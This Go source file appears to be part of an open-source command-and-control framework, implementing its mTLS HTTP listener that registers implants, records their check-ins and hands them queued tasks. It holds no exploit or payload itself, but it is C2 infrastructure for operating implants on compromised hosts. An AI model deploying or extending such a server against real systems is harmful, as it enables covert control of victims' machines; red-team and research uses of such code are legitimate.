package c2ext

import (
	"crypto/tls"
	"encoding/json"
	"net/http"
	"path/filepath"

	"github.com/dovelus/corb4n-c2/server/comunication"
	"github.com/dovelus/corb4n-c2/server/db"
	"github.com/gorilla/mux"
)

type Request struct {
	ReqType string          `json:"req_type"`
	Content json.RawMessage `json:"content"`
}

// logRequest is a middleware that logs the details of each request
func logRequest(handler http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		comunication.Logger.Infof("Received request: %s %s from %s", req.Method, req.URL.Path, req.RemoteAddr)
		handler.ServeHTTP(w, req)
	})
}

// Handler function to process requests based on ReqType
func requestHandler(w http.ResponseWriter, r *http.Request) {
	// Parse the request
	var req Request
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode request: %v", err)
		return
	}

	// Process the request based on ReqType
	switch req.ReqType {
	case "InsertImplantInfo":
		handleInsertImplantInfo(w, req.Content)
	case "UpdateImplantLastCheckin":
		handleUpdateImplantLastCheckin(w, req.Content)
	case "GetTasksByImplantID":
		handleGetTasksByImplantID(w, req.Content)
	default:
		http.Error(w, "unknown request type", http.StatusBadRequest)
		comunication.Logger.Errorf("unknown request type: %s", req.ReqType)
	}
}

// Handle ImplantInfo request
func handleInsertImplantInfo(w http.ResponseWriter, content json.RawMessage) {
	var implant *db.Implant_info
	err := json.Unmarshal(content, &implant)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode implant info: %v", err)
		return
	}

	err = db.AddImplant(implant)
	if err == comunication.ErrImplantExists {
		http.Error(w, err.Error(), http.StatusConflict)
		comunication.Logger.Errorf("implant already exists: %v", err)
		return
	}
}

func handleUpdateImplantLastCheckin(w http.ResponseWriter, content json.RawMessage) {
	var data struct {
		ID string `json:"id"`
	}
	err := json.Unmarshal(content, &data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode update implant last checkin request: %v", err)
		return
	}

	err = db.UpdateImplantCheckin(data.ID)
	if err == comunication.ErrNoResults {
		http.Error(w, err.Error(), http.StatusNotFound)
		comunication.Logger.Errorf("no results found: %v", err)
		return
	}
}

func handleGetTasksByImplantID(w http.ResponseWriter, content json.RawMessage) {
	var data struct {
		ID        string `json:"id"`
		Completed bool   `json:"completed"`
	}
	err := json.Unmarshal(content, &data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode get tasks by implant ID request: %v", err)
		return
	}

	tasks, err := db.GetImplantTasks(data.ID, data.Completed)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to get tasks by implant ID: %v", err)
		return
	}

	tasksJSON, err := json.Marshal(tasks)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to encode tasks: %v", err)
		return
	}

	// Log the readable JSON string
	comunication.Logger.Infof("tasks JSON: %s", string(tasksJSON))

	w.Header().Set("Content-Type", "application/json")
	w.Write(tasksJSON)
}

func StartExtHTTPServer() {
	serverCertPath, err := filepath.Abs(filepath.Join("certs", "server.crt"))
	if err != nil {
		comunication.Logger.Fatalf("failed to get absolute path for server certificate: %v", err)
	}
	serverKeyPath, err := filepath.Abs(filepath.Join("certs", "server.key"))
	if err != nil {
		comunication.Logger.Fatalf("failed to get absolute path for server key: %v", err)
	}

	serverCert, err := LoadServerCertificate(serverCertPath, serverKeyPath)
	if err != nil {
		comunication.Logger.Fatalf("failed to load server certificate: %v", err)
	}

	clientCAPool, err := LoadClientCACertificate(filepath.Join("certs", "client.crt"))
	if err != nil {
		comunication.Logger.Fatalf("failed to load client CA certificate: %v", err)
	}

	tlsConfig := CreateTLSConfig(serverCert, clientCAPool)

	r := mux.NewRouter()
	r.Use(logRequest)
	r.HandleFunc("/request", requestHandler).Methods("POST")

	srv := &http.Server{
		Addr:         "localhost:8443",
		Handler:      r,
		TLSConfig:    tlsConfig,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
	}

	comunication.Logger.Infof("Starting external mTLS-HTTP server on %s", srv.Addr)
	comunication.Logger.Fatal(srv.ListenAndServeTLS("", ""))
}
